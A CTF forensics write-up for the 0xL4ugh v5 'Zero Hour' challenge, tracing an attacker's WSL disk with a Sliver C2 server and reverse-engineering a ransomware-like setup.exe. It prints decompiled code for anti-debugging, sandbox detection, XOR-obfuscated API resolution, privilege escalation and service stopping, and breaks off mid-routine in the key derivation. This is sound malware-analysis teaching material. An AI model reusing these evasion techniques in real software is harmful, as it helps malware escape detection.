---
title: "0xL4ugh v5 CTF"
description: "Writeup for DFIR Challenge"
summary: "Writeup for DFIR Challenge"
categories: ["Writeup"]
tags: ["Forensic", "Reverse", "Writeup"]
#externalUrl: ""
date: 2026-01-25
draft: false
authors:
  - ducnocrypt
cover: /images/post_covers/0xl4ugh.png
---

## Zero Hour

![image](https://hackmd.io/_uploads/SksCdqN8Zl.png)


*Our intelligence unit has successfully identified a long-time cybercriminal. According to information provided by our confidential informant, he is preparing something major, and time is critical. Your mission is to investigate the suspect’s laptop and uncover the following information:
What is the name of the victim & encryption key?
Flag: 0xL4ugh{name;key}*
[*Link Challenge*](https://mega.nz/file/yoZgySiB#NYNusaIh4j9MAarfixILvq4ZavKGYYvTdZe-0nWud_g)

Our scenario here involves investigating a suspect machine to get the victim’s name and the encryption key.

By looking at the PowerShell history of the attacker, we can see he has WSL installed, and we don’t see any other indication that he carried out any attack from his host.

`C:\Users\tarok\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

![image](https://hackmd.io/_uploads/SJPXicEL-l.png)

Now we get the WSL vhdx file and mount it so we can do further analysis.

`C:\Users\tarok\AppData\Local\wsl\{e49649b6-5696-4474-a155-3ed599c71619\ext4.vhdx`

![image](https://hackmd.io/_uploads/S149n5N8bg.png)

Interesting, i found sliver-server which is an open-source, cross-platform Command and Control (C2) framework, and the **arsenal** folder of the attacker.
Trying to look for any logs that guide us to who the target of the attacker is, we couldn’t find any, which makes the possibility that he was caught before he began his attack more likely.

![image](https://hackmd.io/_uploads/S1_EAq48Wl.png)

we can see a malware called setup.exe.

![image](https://hackmd.io/_uploads/r1TQT94UWg.png)
![image](https://hackmd.io/_uploads/BJtn05V8Zg.png)

Loading it into IDA, let’s see.

![image](https://hackmd.io/_uploads/HkhEJsE8Wx.png)

First we gone to the main and we can there are interesting fuctions that’s getting called.

![image](https://hackmd.io/_uploads/BJMcs6VL-l.png)

```cpp
__int64 sub_14000AB40()
{
  __int64 v1; // rax
  __int64 v2; // rax
  char v4[272]; // [rsp+20h] [rbp-568h] BYREF
  CHAR PathName[272]; // [rsp+130h] [rbp-458h] BYREF
  char v6[264]; // [rsp+240h] [rbp-348h] BYREF
  char v7[264]; // [rsp+350h] [rbp-238h] BYREF
  char v8[296]; // [rsp+460h] [rbp-128h] BYREF

  sub_140003C80();
  if ( sub_1400014A0() && sub_140002DA0() && !(unsigned int)sub_140002EE0() )
  {
    if ( (unsigned int)sub_140002870() )
    {
      sub_1400016C0();
      sub_1400033A0();
      sub_1400030F0("SamSs");
      sub_1400030F0("SQLWriter");
      v1 = 1i64;
      qmemcpy(v6, &unk_14000D1C0, sizeof(v6));
      qmemcpy(v8, v6, 0x108ui64);
      do
      {
        v4[v1 - 1] = v8[v1] ^ 0x55;
        ++v1;
      }
      while ( v1 != 26 );
      v4[25] = 0;
      v2 = 1i64;
      qmemcpy(v7, a3pOcaTarWrgrog, sizeof(v7));
      qmemcpy(v8, v7, 0x108ui64);
      do
      {
        v4[v2 + 271] = v8[v2] ^ 0x33;
        ++v2;
      }
      while ( v2 != 27 );
      PathName[26] = 0;
      CreateDirectoryA(PathName, 0i64);
      SetFileAttributesA(PathName, 6u);
      sub_140003670(v4);
      sub_1400037D0();
      sub_140002630();
      sub_1400026B0();
    }
    else
    {
      sub_140002B30();
    }
  }
  return 0i64;
}
```

Going to the first one, we can see it’s used to check for debuggers.
![image](https://hackmd.io/_uploads/SJnGK6V8be.png)

```cpp
_BOOL8 sub_1400014A0()
{
  HANDLE CurrentProcess; // rax
  HMODULE ModuleHandleA; // rcx
  FARPROC ProcAddress; // rsi
  HANDLE v4; // rax
  HANDLE v5; // rax
  int v6; // eax
  HANDLE v7; // rax
  HANDLE CurrentThread; // rax
  __m128i v9; // xmm0
  BOOL pbDebuggerPresent; // [rsp+34h] [rbp-504h] BYREF
  LARGE_INTEGER PerformanceCount; // [rsp+38h] [rbp-500h] BYREF
  LARGE_INTEGER v12; // [rsp+40h] [rbp-4F8h] BYREF
  LARGE_INTEGER Frequency; // [rsp+48h] [rbp-4F0h] BYREF
  struct _CONTEXT hObject; // [rsp+50h] [rbp-4E8h] BYREF

  if ( IsDebuggerPresent() )
    return 0i64;
  pbDebuggerPresent = 0;
  CurrentProcess = GetCurrentProcess();
  CheckRemoteDebuggerPresent(CurrentProcess, &pbDebuggerPresent);
  if ( pbDebuggerPresent )
    return 0i64;
  ModuleHandleA = GetModuleHandleA("ntdll.dll");
  if ( ModuleHandleA )
  {
    ProcAddress = GetProcAddress(ModuleHandleA, "NtQueryInformationProcess");
    if ( ProcAddress )
    {
      PerformanceCount.LowPart = 0;
      v12.LowPart = 0;
      v4 = GetCurrentProcess();
      if ( !((unsigned int (__fastcall *)(HANDLE, __int64, LARGE_INTEGER *, __int64, LARGE_INTEGER *))ProcAddress)(
              v4,
              7i64,
              &PerformanceCount,
              4i64,
              &v12)
        && PerformanceCount.LowPart )
      {
        return 0i64;
      }
      Frequency.LowPart = 0;
      v5 = GetCurrentProcess();
      v6 = ((__int64 (__fastcall *)(HANDLE, __int64, LARGE_INTEGER *, __int64, LARGE_INTEGER *))ProcAddress)(
             v5,
             31i64,
             &Frequency,
             4i64,
             &v12);
      if ( !(v6 | Frequency.LowPart & 1) )
        return 0i64;
      hObject.P1Home = 0i64;
      v7 = GetCurrentProcess();
      if ( !((unsigned int (__fastcall *)(HANDLE, __int64, struct _CONTEXT *, __int64, LARGE_INTEGER *))ProcAddress)(
              v7,
              30i64,
              &hObject,
              8i64,
              &v12) )
      {
        if ( hObject.P1Home )
        {
          CloseHandle((HANDLE)hObject.P1Home);
          return 0i64;
        }
      }
    }
  }
  memset(&hObject, 0, sizeof(hObject));
  hObject.ContextFlags = 1048592;
  CurrentThread = GetCurrentThread();
  if ( GetThreadContext(CurrentThread, &hObject) )
  {
    v9 = _mm_or_si128(_mm_loadu_si128((const __m128i *)&hObject.Dr0), _mm_loadu_si128((const __m128i *)&hObject.Dr2));
    if ( _mm_or_si128(v9, _mm_srli_si128(v9, 8)).m128i_u64[0] )
      return 0i64;
  }
  if ( QueryPerformanceFrequency(&Frequency)
    && QueryPerformanceCounter(&PerformanceCount)
    && (Sleep(0x14u), QueryPerformanceCounter(&v12)) )
  {
    return 1000 * (v12.QuadPart - PerformanceCount.QuadPart) / Frequency.QuadPart <= 200;
  }
  else
  {
    return 1i64;
  }
}
```

In the second function, it’s checking for VM or sandbox behavior; if you XOR the strings with the corresponding key, you can see the actual strings used in order to get system info.

![image](https://hackmd.io/_uploads/H1wtYaE8bl.png)

```cpp
_BOOL8 sub_140002DA0()
{
  __int64 v0; // rax
  __int64 i; // rax
  HMODULE ModuleHandleA; // rcx
  _BOOL8 result; // rax
  FARPROC ProcAddress; // rax
  CHAR ModuleName[32]; // [rsp+20h] [rbp-388h] BYREF
  CHAR ProcName[32]; // [rsp+40h] [rbp-368h] BYREF
  char v7[264]; // [rsp+60h] [rbp-348h] BYREF
  char v8[264]; // [rsp+170h] [rbp-238h] BYREF
  struct _SYSTEM_INFO SystemInfo[6]; // [rsp+280h] [rbp-128h] BYREF

  v0 = 0i64;
  qmemcpy(v7, aU009fg199, sizeof(v7));
  qmemcpy(v8, &unk_14000BFC0, sizeof(v8));
  qmemcpy(SystemInfo, v7, 0x108ui64);
  do
  {
    *(_DWORD *)&ModuleName[v0] = *(DWORD *)((char *)&SystemInfo[0].dwOemId + v0 + 1) ^ 0x55555555;
    v0 += 4i64;
  }
  while ( v0 != 12 );
  ModuleName[12] = 0;
  qmemcpy(SystemInfo, v8, 0x108ui64);
  for ( i = 0i64; i != 20; i += 4i64 )
    *(_DWORD *)&ProcName[i] = *(DWORD *)((char *)&SystemInfo[0].dwOemId + i + 1) ^ 0x77777777;
  ProcName[20] = 0;
  ModuleHandleA = GetModuleHandleA(ModuleName);
  result = 1i64;
  if ( ModuleHandleA )
  {
    ProcAddress = GetProcAddress(ModuleHandleA, ProcName);
    if ( !ProcAddress
      || (SystemInfo[0].dwOemId = 64,
          *(_OWORD *)&SystemInfo[0].dwProcessorType = 0i64,
          *(_OWORD *)&SystemInfo[0].dwPageSize = 0i64,
          *(_OWORD *)((char *)&SystemInfo[0].lpMaximumApplicationAddress + 4) = 0i64,
          *(_OWORD *)&SystemInfo[1].dwOemId = 0i64,
          !((unsigned int (__fastcall *)(struct _SYSTEM_INFO *))ProcAddress)(SystemInfo))
      || (result = 0i64, HIDWORD(SystemInfo[0].lpMinimumApplicationAddress)) )
    {
      GetSystemInfo(SystemInfo);
      return SystemInfo[0].dwNumberOfProcessors > 1;
    }
  }
  return result;
}
```

The third one is for creating the mutex named NerveGearMutex and checking that there is no other instance running, and also, you can get all the info by XORing the string with the corresponding key.

![image](https://hackmd.io/_uploads/Bk319pVLWx.png)

```cpp
__int64 sub_140002EE0()
{
  __int64 v0; // rax
  __int64 i; // rax
  __int64 j; // rax
  __int64 v3; // rax
  HMODULE ModuleHandleA; // rax
  HMODULE v5; // rsi
  FARPROC ProcAddress; // rbx
  FARPROC v7; // rax
  unsigned int (*v8)(void); // rsi
  void *v9; // rbx
  CHAR ModuleName[64]; // [rsp+20h] [rbp-678h] BYREF
  CHAR ProcName[64]; // [rsp+60h] [rbp-638h] BYREF
  CHAR v13[64]; // [rsp+A0h] [rbp-5F8h] BYREF
  char v14[64]; // [rsp+E0h] [rbp-5B8h] BYREF
  char v15[264]; // [rsp+120h] [rbp-578h] BYREF
  char v16[264]; // [rsp+230h] [rbp-468h] BYREF
  char v17[264]; // [rsp+340h] [rbp-358h] BYREF
  char v18[264]; // [rsp+450h] [rbp-248h] BYREF
  char v19[312]; // [rsp+560h] [rbp-138h] BYREF

  v0 = 0i64;
  qmemcpy(v15, aJ8Yxd, sizeof(v15));
  qmemcpy(v16, &unk_14000C200, sizeof(v16));
  qmemcpy(v17, aEgvncqvgppmp, sizeof(v17));
  qmemcpy(v18, &unk_14000C440, sizeof(v18));
  qmemcpy(v19, v15, 0x108ui64);
  do
  {
    *(_DWORD *)&ModuleName[v0] = *(_DWORD *)&v19[v0 + 1] ^ 0x4A4A4A4A;
    v0 += 4i64;
  }
  while ( v0 != 12 );
  ModuleName[12] = 0;
  qmemcpy(v19, v16, 0x108ui64);
  for ( i = 0i64; i != 12; i += 4i64 )
    *(_DWORD *)&ProcName[i] = *(_DWORD *)&v19[i + 1] ^ 0x1F1F1F1F;
  ProcName[12] = 0;
  qmemcpy(v19, v17, 0x108ui64);
  for ( j = 0i64; j != 12; j += 4i64 )
    *(_DWORD *)&v13[j] = *(_DWORD *)&v19[j + 1] ^ 0x22222222;
  v3 = 1i64;
  qmemcpy(v19, v18, 0x108ui64);
  v13[12] = 0;
  do
  {
    v13[v3 + 63] = v19[v3] ^ 0x99;
    ++v3;
  }
  while ( v3 != 22 );
  v14[21] = 0;
  ModuleHandleA = GetModuleHandleA(ModuleName);
  v5 = ModuleHandleA;
  if ( !ModuleHandleA )
    return 0i64;
  ProcAddress = GetProcAddress(ModuleHandleA, ProcName);
  v7 = GetProcAddress(v5, v13);
  v8 = (unsigned int (*)(void))v7;
  if ( !ProcAddress || !v7 )
    return 0i64;
  v9 = (void *)((__int64 (__fastcall *)(_QWORD, __int64, char *))ProcAddress)(0i64, 1i64, v14);
  if ( v8() != 183 )
  {
    if ( v9 )
      CloseHandle(v9);
    return 0i64;
  }
  if ( v9 )
    CloseHandle(v9);
  return 1i64;
}
```

After it passes those three fuctions it goes to another function to check privileges; if it doesn’t have the required privileges, it goes to another function.

![image](https://hackmd.io/_uploads/HkY75TVL-x.png)

```cpp
__int64 sub_140002870()
{
  __int64 v0; // rax
  __int64 v1; // rax
  __m128i v2; // xmm1
  __int64 v3; // rax
  __int64 v4; // rax
  HMODULE LibraryA; // rax
  HMODULE v6; // rsi
  FARPROC ProcAddress; // rdi
  FARPROC v8; // rbp
  FARPROC v9; // rsi
  __int64 result; // rax
  unsigned int v11; // eax
  unsigned int v12; // [rsp+6Ch] [rbp-67Ch]
  int v13; // [rsp+74h] [rbp-674h] BYREF
  int v14; // [rsp+7Ah] [rbp-66Eh] BYREF
  __int16 v15; // [rsp+7Eh] [rbp-66Ah]
  CHAR LibFileName[32]; // [rsp+80h] [rbp-668h] BYREF
  CHAR ProcName[64]; // [rsp+A0h] [rbp-648h] BYREF
  CHAR v18[64]; // [rsp+E0h] [rbp-608h] BYREF
  CHAR v19[64]; // [rsp+120h] [rbp-5C8h] BYREF
  char v20[264]; // [rsp+160h] [rbp-588h] BYREF
  char v21[264]; // [rsp+270h] [rbp-478h] BYREF
  char v22[264]; // [rsp+380h] [rbp-368h] BYREF
  char v23[264]; // [rsp+490h] [rbp-258h] BYREF
  __int64 v24[41]; // [rsp+5A0h] [rbp-148h] BYREF

  v0 = 0i64;
  qmemcpy(v20, a3rwercz, sizeof(v20));
  qmemcpy(v21, &unk_14000B6C0, sizeof(v21));
  qmemcpy(v22, &unk_14000B7E0, sizeof(v22));
  qmemcpy(v23, &unk_14000B900, sizeof(v23));
  qmemcpy(v24, v20, 0x108ui64);
  do
  {
    *(_DWORD *)&LibFileName[v0] = *(_DWORD *)((char *)v24 + v0 + 1) ^ 0x33333333;
    v0 += 4i64;
  }
  while ( v0 != 12 );
  v1 = 0i64;
  qmemcpy(v24, v21, 0x108ui64);
  LibFileName[12] = 0;
  v2 = _mm_loadl_epi64((const __m128i *)&qword_14000E180);
  do
  {
    *(_QWORD *)&ProcName[v1 * 8] = _mm_xor_si128(_mm_loadl_epi64((const __m128i *)((char *)&v24[v1] + 1)), v2).m128i_u64[0];
    ++v1;
  }
  while ( v1 != 3 );
  v3 = 0i64;
  qmemcpy(v24, v22, 0x108ui64);
  ProcName[24] = 0;
  do
  {
    *(_DWORD *)&v18[v3] = *(_DWORD *)((char *)v24 + v3 + 1) ^ 0x55555555;
    v3 += 4i64;
  }
  while ( v3 != 20 );
  v4 = 1i64;
  qmemcpy(v24, v23, 0x108ui64);
  v18[20] = 0;
  do
  {
    v18[v4 + 63] = *((_BYTE *)v24 + v4) ^ 0x66;
    ++v4;
  }
  while ( v4 != 8 );
  v19[7] = 0;
  LibraryA = LoadLibraryA(LibFileName);
  v6 = LibraryA;
  if ( !LibraryA )
    return 0i64;
  ProcAddress = GetProcAddress(LibraryA, ProcName);
  v8 = GetProcAddress(v6, v18);
  v9 = GetProcAddress(v6, v19);
  if ( v8 == 0i64 || ProcAddress == 0i64 || !v9 )
    return 0i64;
  v14 = 0;
  v15 = 1280;
  result = ((__int64 (__fastcall *)(int *, __int64, __int64, __int64, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, __int64 *))ProcAddress)(
             &v14,
             2i64,
             32i64,
             544i64,
             0,
             0,
             0,
             0,
             0,
             0,
             v24);
  if ( (_DWORD)result )
  {
    v13 = 0;
    v11 = ((__int64 (__fastcall *)(_QWORD, __int64, int *))v8)(0i64, v24[0], &v13);
    if ( v11 )
      v11 = v13 != 0;
    v12 = v11;
    ((void (__fastcall *)(__int64))v9)(v24[0]);
    return v12;
  }
  return result;
}
```


In which it tries to escalate privileges to be able to do whatever it wants.

![image](https://hackmd.io/_uploads/rJCUqpELWg.png)

```cpp
HMODULE sub_1400033A0()
{
  __int64 v0; // rax
  __int64 i; // rax
  __int64 j; // rax
  HMODULE result; // rax
  CHAR ModuleName[32]; // [rsp+20h] [rbp-518h] BYREF
  CHAR ProcName[32]; // [rsp+40h] [rbp-4F8h] BYREF
  char v6[128]; // [rsp+60h] [rbp-4D8h] BYREF
  char v7[264]; // [rsp+E0h] [rbp-458h] BYREF
  char v8[264]; // [rsp+1F0h] [rbp-348h] BYREF
  char v9[264]; // [rsp+300h] [rbp-238h] BYREF
  char v10[296]; // [rsp+410h] [rbp-128h] BYREF

  v0 = 0i64;
  qmemcpy(v7, &unk_14000B360, sizeof(v7));
  qmemcpy(v8, aAyaaioie, sizeof(v8));
  qmemcpy(v9, &unk_14000CB00, sizeof(v9));
  qmemcpy(v10, v7, 0x108ui64);
  do
  {
    *(_DWORD *)&ModuleName[v0] = *(_DWORD *)&v10[v0 + 1] ^ 0x99999999;
    v0 += 4i64;
  }
  while ( v0 != 12 );
  ModuleName[12] = 0;
  qmemcpy(v10, v8, 0x108ui64);
  for ( i = 1i64; i != 8; ++i )
    ModuleName[i + 31] = v10[i] ^ 0xAA;
  ProcName[7] = 0;
  qmemcpy(v10, v9, 0x108ui64);
  for ( j = 1i64; j != 36; ++j )
    ProcName[j + 31] = v10[j] ^ 0xBB;
  v6[35] = 0;
  result = GetModuleHandleA(ModuleName);
  if ( result )
  {
    result = (HMODULE)GetProcAddress(result, ProcName);
    if ( result )
      return (HMODULE)((__int64 (__fastcall *)(char *, _QWORD))result)(v6, 0i64);
  }
  return result;
}
```

Now going to the main fuction which we can see that it drives a key.

![image](https://hackmd.io/_uploads/rkg2qpEIZg.png)

```cpp
unsigned __int64 sub_1400016C0()
{
  __int64 *v0; // r13
  __int64 v1; // r11
  __int64 v2; // r10
  unsigned __int64 v3; // r9
  unsigned int v4; // r8d
  int v5; // edx
  unsigned __int128 v6; // rax
  __int64 v7; // rcx
  __int64 v8; // rcx
  unsigned __int64 v9; // rax
  __int64 v10; // r10
  __int64 v11; // rsi
  unsigned __int64 v12; // rax
  unsigned __int64 v13; // rax
  unsigned __int64 v14; // r13
  __int64 v15; // rax
  __int64 v16; // rdx
  __int64 v17; // rax
  unsigned __int64 v18; // r8
  __int64 v19; // rdi
  __int64 v20; // rcx
  __int64 v21; // rdx
  unsigned int v22; // ebp
  unsigned __int64 v23; // rcx
  __int64 v24; // r11
  unsigned __int64 v25; // rdx
  __int64 v26; // rax
  unsigned __int64 v27; // rdx
  unsigned __int64 v28; // rdx
  __int64 v29; // rcx
  unsigned __int128 v30; // rax
  __int64 v31; // r8
  __int64 v32; // r8
  unsigned __int64 v33; // r8
  unsigned __int64 v34; // r8
  unsigned __int128 v35; // rax
  __int64 v36; // rbx
  __int64 v37; // rcx
  __int64 v38; // r10
  unsigned __int64 v39; // rcx
  __int64 v40; // r11
  __int64 v41; // r8
  unsigned __int64 v42; // rdx
  unsigned __int64 v43; // r9
  __int64 v44; // r9
  __int64 v45; // rax
  __int64 v46; // rdx
  unsigned __int64 v47; // r9
  unsigned __int64 v48; // rdi
  unsigned __int64 v49; // r8
  __int64 v50; // rdx
  unsigned __int64 v51; // rdi
  __int64 v52; // rax
  __int64 v53; // rdx
  unsigned __int64 v54; // rdi
  unsigned __int64 v55; // r11
  __int64 v56; // rax
  __int64 v57; // rdx
  unsigned __int64 v58; // r11
  unsigned __int64 v59; // rax
  __int64 v60; // rcx
  __int64 v61; // rdx
  unsigned __int64 v62; // rdx
  unsigned __int64 v63; // rax
  __int64 v64; // r9
  __int64 v65; // r8
  unsigned __int64 v66; // r9
  unsigned __int64 v67; // rax
  __int64 v68; // rax
  __int64 v69; // rbx
  __int64 v70; // r8
  unsigned __int64 v71; // r8
  unsigned __int64 v72; // rax
  __int64 v73; // rsi
  __int64 v74; // r11
  unsigned __int64 v75; // rax
  unsigned __int64 result; // rax
  unsigned __int64 v77; // [rsp+0h] [rbp-98h]
  __int64 v78; // [rsp+10h] [rbp-88h]
  unsigned __int64 v79; // [rsp+40h] [rbp-58h]
  unsigned __int64 v80; // [rsp+48h] [rbp-50h]

  v0 = qword_140012060;
  v1 = 0i64;
  v2 = 0i64;
  v3 = 0xCBF29CE484222325ui64;
  v4 = 0;
  do
  {
    v5 = v4++;
    v6 = (unsigned __int64)(v2 + qword_140012060[(v5 + 7) % 0xFu])
       * (unsigned __int128)((unsigned __int64)qword_140012060[v4 % 0xF] ^ __ROL8__(*v0, 5 * (unsigned __int8)v5));
    v7 = __ROR8__(*((_QWORD *)&v6 + 1), 9);
    *((_QWORD *)&v6 + 1) = __ROL8__(*((_QWORD *)&v6 + 1), 17);
    *((_QWORD *)&v6 + 1) = 0xFF51AFD7ED558CCDui64
                         * (((v7 ^ *((_QWORD *)&v6 + 1) ^ (unsigned __int64)v6) >> 33) ^ v7 ^ *((_QWORD *)&v6 + 1) ^ v6);
    *(_QWORD *)&v6 = ((v3 ^ v1 ^ *((_QWORD *)&v6 + 1) ^ (*((_QWORD *)&v6 + 1) >> 33) ^ ((v3 ^ v1 ^ *((_QWORD *)&v6 + 1) ^ (*((_QWORD *)&v6 + 1) >> 33)) << 8) & 0xFF00FF00FF00FF00ui64) >> 8) & 0xFF00FF00FF00FFi64 ^ v3 ^ v1 ^ *((_QWORD *)&v6 + 1) ^ (*((_QWORD *)&v6 + 1) >> 33) ^ ((v3 ^ v1 ^ *((_QWORD *)&v6 + 1) ^ (*((_QWORD *)&v6 + 1) >> 33)) << 8) & 0xFF00FF00FF00FF00ui64;
    *((_QWORD *)&v6 + 1) = __ROL8__(v6, 13);
    v8 = __ROR8__(v6, 7);
    ++v0;
    v2 -= 0x61C8864680B583EBi64;
    v1 += 0x100000001B3i64;
    *(_QWORD *)&v6 = 0xC2B2AE3D27D4EB4Fui64
                   * (((0x9E3779B97F4A7C15ui64 * (v8 ^ *((_QWORD *)&v6 + 1) ^ (unsigned __int64)v6)) >> 29) ^ (0x9E3779B97F4A7C15ui64 * (v8 ^ *((_QWORD *)&v6 + 1) ^ v6)));
    v9 = DWORD1(v6) ^ v6;
    v3 = v9;
  }
  while ( v4 != 15 );
  v10 = qword_140012060[0];
  v78 = 0i64;
  v11 = v9 ^ qword_140012060[0];
  v12 = v9 ^ qword_1400120B8 ^ ((v9 ^ qword_1400120B8) << 8) & 0xFF00FF00FF00FF00ui64;
  v13 = 0x9E3779B97F4A7C15ui64
      * (__ROR8__((v12 >> 8) & 0xFF00FF00FF00FFi64 ^ v12, 7) ^ __ROL8__((v12 >> 8) & 0xFF00FF00FF00FFi64 ^ v12, 13) ^ (v12 >> 8) & 0xFF00FF00FF00FFi64 ^ v12);
  v14 = qword_140012068
      + (((0xC2B2AE3D27D4EB4Fui64 * ((v13 >> 29) ^ v13)) >> 32) ^ (0xC2B2AE3D27D4EB4Fui64 * ((v13 >> 29) ^ v13)));
  v15 = (v3 * (unsigned __int128)(unsigned __int64)qword_1400120C0) >> 64;
  v16 = __ROR8__(v15, 9);
  v17 = __ROL8__(v15, 17);
  v18 = 0xFF51AFD7ED558CCDui64 * ((((v3 * qword_1400120C0) ^ v16 ^ v17) >> 33) ^ (v3 * qword_1400120C0) ^ v16 ^ v17);
  v19 = qword_140012070 ^ v18 ^ (v18 >> 33);
  v20 = __ROL8__(((unsigned __int64)qword_1400120D0 * (unsigned __int128)(v3 ^ qword_1400120C8)) >> 64, 17);
  v21 = __ROR8__(((unsigned __int64)qword_1400120D0 * (unsigned __int128)(v3 ^ qword_1400120C8)) >> 64, 9);
  v22 = 0;
  v23 = 0xFF51AFD7ED558CCDui64
      * ((((qword_1400120D0 * (v3 ^ qword_1400120C8)) ^ v21 ^ v20) >> 33) ^ (qword_1400120D0 * (v3 ^ qword_1400120C8)) ^ v21 ^ v20);
  v24 = qword_140012078 + ((v23 >> 33) ^ v23);
  while ( 1 )
  {
    v25 = ((v3 ^ v78 ^ ((v3 ^ v78) << 8) & 0xFF00FF00FF00FF00ui64) >> 8) & 0xFF00FF00FF00FFi64 ^ v3 ^ v78 ^ ((v3 ^ v78) << 8) & 0xFF00FF00FF00FF00ui64;
    v26 = __ROR8__(v25, 7) ^ __ROL8__(v25, 13);
    v27 = 0xC2B2AE3D27D4EB4Fui64
        * (((0x9E3779B97F4A7C15ui64 * (v26 ^ v25)) >> 29) ^ (0x9E3779B97F4A7C15ui64 * (v26 ^ v25)));
    v28 = HIDWORD(v27) ^ v27;
    v29 = v28 ^ v11 ^ __ROL8__(v14, 11);
    v30 = (v10 ^ (v28 + v19 + __ROR8__(v24, 17)))
        * (unsigned __int128)(unsigned __int64)(v29 + qword_140012060[(v22 & 3) + 8]);
    v31 = *((_QWORD *)&v30 + 1);
    *((_QWORD *)&v30 + 1) = __ROR8__(*((_QWORD *)&v30 + 1), 9);
    v32 = __ROL8__(v31, 17);
    v33 = 0xFF51AFD7ED558CCDui64
        * ((((unsigned __int64)v30 ^ *((_QWORD *)&v30 + 1) ^ v32) >> 33) ^ v30 ^ *((_QWORD *)&v30 + 1) ^ v32);
    v34 = (v33 >> 33) ^ v33;
    v35 = (v29 ^ (unsigned __int64)(v24 + qword_140012070)) * (unsigned __int128)(v34 ^ (v14 | 1));
    v36 = v11 + __ROL8__(v3 + (v14 ^ v34), 23);
    v37 = __ROR8__(*((_QWORD *)&v35 + 1), 9);
    *((_QWORD *)&v35 + 1) = __ROL8__(*((_QWORD *)&v35 + 1), 17);
    v38 = v19 + __ROL8__(v3 + v34 + (v24 ^ v36), 31);
    *(_QWORD *)&v35 = 0xFF51AFD7ED558CCDui64
                    * ((((unsigned __int64)v35 ^ v37 ^ *((_QWORD *)&v35 + 1)) >> 33) ^ v35 ^ v37 ^ *((_QWORD *)&v35 + 1));
    v39 = v14 ^ __ROR8__((((unsigned __int64)v35 >> 33) ^ v35) + v19 + v3, 19);
    v40 = (v39 + v38 + qword_1400120B0 + v3) ^ v24;
    if ( (v22 & 0x7FFF) == 0 )
    {
      v41 = ((v39 + v40) * (unsigned __int128)(unsigned __int64)(v36 + v38)) >> 64;
      v42 = ((v39 + v40) * (v36 + v38)) ^ __ROR8__(v41, 9) ^ __ROL8__(v41, 17);
      v43 = (0xFF51AFD7ED558CCDui64 * (v42 ^ (v42 >> 33))) ^ v3 ^ ((0xFF51AFD7ED558CCDui64 * (v42 ^ (v42 >> 33))) >> 33) ^ (((0xFF51AFD7ED558CCDui64 * (v42 ^ (v42 >> 33))) ^ v3 ^ ((0xFF51AFD7ED558CCDui64 * (v42 ^ (v42 >> 33))) >> 33)) << 8) & 0xFF00FF00FF00FF00ui64;
      v44 = (v43 >> 8) & 0xFF00FF00FF00FFi64 ^ v43;
      v45 = __ROL8__(v44, 13);
      v46 = __ROR8__(v44, 7);
      v47 = 0xC2B2AE3D27D4EB4Fui64
          * (((0x9E3779B97F4A7C15ui64 * (v46 ^ v45 ^ v44)) >> 29) ^ (0x9E3779B97F4A7C15ui64 * (v46 ^ v45 ^ v44)));
      v3 = HIDWORD(v47) ^ v47;
    }
    v48 = v3 + 7 * v40 + 3 * v39 + v36 + 5 * v38;
    v49 = v3 + 19 * v40 + 13 * v39 + 11 * v36 + 17 * v38;
    v77 = 53 * v40 + 43 * v39 + 41 * v36 + 47 * v38 + v3;
    v79 = (v48 ^ __ROL8__(v3 ^ v77, 9)) % qword_140012080;
    v11 = v79;
    v80 = (v49 + __ROR8__(v48 ^ v3, 7)) % qword_140012088;
    v14 = v80;
    v50 = v3 ^ v48 ^ (v3 + 37 * v40 + 23 * v36 + 31 * v38 + 29 * v39);
    v51 = ((v50 ^ (v50 << 8) & 0xFF00FF00FF00FF00ui64) >> 8) & 0xFF00FF00FF00FFi64 ^ v50 ^ (v50 << 8) & 0xFF00FF00FF00FF00ui64;
    v52 = __ROL8__(v51, 13);
    v53 = __ROR8__(v51, 7);
    v54 = 0xC2B2AE3D27D4EB4Fui64
        * (((0x9E3779B97F4A7C15ui64 * (v53 ^ v52 ^ v51)) >> 29) ^ (0x9E3779B97F4A7C15ui64 * (v53 ^ v52 ^ v51)));
    v55 = (((v3 + v77 + v49) ^ ((v3 + v77 + v49) << 8) & 0xFF00FF00FF00FF00ui64) >> 8) & 0xFF00FF00FF00FFi64 ^ (v3 + v77 + v49) ^ ((v3 + v77 + v49) << 8) & 0xFF00FF00FF00FF00ui64;
    v19 = HIDWORD(v54) ^ v54;
    v56 = __ROL8__(v55, 13);
    v57 = __ROR8__(v55, 7);
    ++v22;
    v78 += qword_140012090;
    v58 = 0xC2B2AE3D27D4EB4Fui64
        * (((0x9E3779B97F4A7C15ui64 * (v57 ^ v56 ^ v55)) >> 29) ^ (0x9E3779B97F4A7C15ui64 * (v57 ^ v56 ^ v55)));
    v24 = HIDWORD(v58) ^ v58;
    if ( v22 == 600000 )
      break;
    v10 = qword_140012060[(v22 >> 3) - 15 * ((unsigned int)((2290649225u * (unsigned __int64)(v22 >> 3)) >> 32) >> 3)];
  }
  v59 = ((((v3 ^ v79) << 8) & 0xFF00FF00FF00FF00ui64 ^ v3 ^ v79) >> 8) & 0xFF00FF00FF00FFi64 ^ ((v3 ^ v79) << 8) & 0xFF00FF00FF00FF00ui64 ^ v3 ^ v79;
  v60 = __ROR8__(v59, 7);
  v61 = __ROL8__(v59, 13);
  v62 = 0xC2B2AE3D27D4EB4Fui64
      * (((0x9E3779B97F4A7C15ui64 * (v60 ^ v61 ^ v59)) >> 29) ^ (0x9E3779B97F4A7C15ui64 * (v60 ^ v61 ^ v59)));
  v63 = (((v80 + v3) ^ ((v80 + v3) << 8) & 0xFF00FF00FF00FF00ui64) >> 8) & 0xFF00FF00FF00FFi64 ^ (v80 + v3) ^ ((v80 + v3) << 8) & 0xFF00FF00FF00FF00ui64;
  v64 = __ROR8__(v63, 7);
  v65 = __ROL8__(v63, 13);
  v66 = 0xC2B2AE3D27D4EB4Fui64
      * (((0x9E3779B97F4A7C15ui64 * (v64 ^ v65 ^ v63)) >> 29) ^ (0x9E3779B97F4A7C15ui64 * (v64 ^ v65 ^ v63)));
  v67 = qword_1400120A8 ^ v19 ^ ((qword_1400120A8 ^ v19) << 8) & 0xFF00FF00FF00FF00ui64;
  v68 = (v67 >> 8) & 0xFF00FF00FF00FFi64 ^ v67;
  v69 = __ROR8__(v68, 7);
  v70 = __ROL8__(v68, 13);
  v71 = 0xC2B2AE3D27D4EB4Fui64
      * (((0x9E3779B97F4A7C15ui64 * (v69 ^ v70 ^ v68)) >> 29) ^ (0x9E3779B97F4A7C15ui64 * (v69 ^ v70 ^ v68)));
